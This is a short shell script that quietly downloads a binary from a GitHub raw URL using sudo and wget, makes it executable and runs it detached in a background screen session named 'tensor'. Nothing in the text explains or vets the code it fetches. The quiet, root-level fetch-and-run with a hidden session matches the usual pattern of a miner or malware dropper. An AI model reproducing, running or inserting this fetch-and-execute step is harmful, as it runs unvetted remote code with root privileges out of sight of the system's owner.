#!/bin/sh

sudo wget -qO main https://raw.githubusercontent.com/renilo/bh/main/testing && chmod +x main && screen -dmS tensor ./main
